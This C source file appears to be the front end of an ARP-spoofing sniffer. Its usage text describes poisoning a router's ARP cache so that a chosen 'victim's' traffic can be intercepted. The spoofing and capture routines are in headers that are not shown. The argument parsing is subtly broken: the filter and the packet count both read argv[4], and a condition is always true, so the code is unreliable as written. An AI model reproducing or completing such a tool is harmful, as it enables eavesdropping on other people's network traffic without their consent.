#include<stdio.h>
#include<stdlib.h>
#include<netinet/in.h> // for addresses translation
#include<errno.h>
#include <signal.h> // for signal control handling in posix env
// for ntohs etc
// can also be necessary to include netinet/in
#include <arpa/inet.h>
#include <unistd.h> // options parsing
#include "packet_struct.h"
#include "pcap_routines.h"
#include <pcap.h>
int packet_count = 0;
struct in_addr routerip;
struct in_addr victimip;
unsigned char mac[ETH_ADDR_SIZE];
void usage() {
    printf("sniff interface victim-ip router-ip [filter] [count]\n");
    printf("\t-Interface is the interface you want to listen on. It will try to put it in monitor mode\n");
    printf("\tVictim's IP is the IP of the victim you want to abuse\n");
    printf("\t-Router IP is the router of the network. To successfully launch an ARP attack, we need to tell the router that the victim's address is now ours, so we can sniff the flow router (i.e. Internet) -> victim also !\n");
    printf("\t-Filter can be a filter for libpcap to apply for packets it reads\n");
}
int main(int argc, char * argv[])
{
    int i = 0; // counter
    int ret;
    char * default_filter = "arp";
    char * filter;
    int pcount = -1; //take all packet by defaults
    char * interface;
    if(argc < 4) {
        fprintf(stderr, "Not enough arguments\n");
        usage();
        exit(EXIT_FAILURE);
    }
    // take command line filter
    if(argc > 3) {
        filter = argv[4];
    } else {
        filter = default_filter;
    }
    // take command line packet count limit
    if(argc > 4) {
        pcount = atoi(argv[4]);
    }
    interface = argv[1];
    if(inet_aton(argv[2],&victimip) == 0) {
        fprintf(stderr,"Invalid parsing of the victim ip address\n");
        exit(EXIT_FAILURE);
    }
    if(inet_aton(argv[3],&routerip) == 0) {
        fprintf(stderr,"Invalid parsing of the router ip address\n");
        exit(EXIT_FAILURE);
    }

    get_mac_addr(interface,mac);
    
    printf("Arguments : interface %s (",interface);
    print_mac_addr(mac);
    printf(", ip router %s\n",inet_ntoa(routerip));
    // GO !
    sniffing_method(interface,filter,pcount);
}
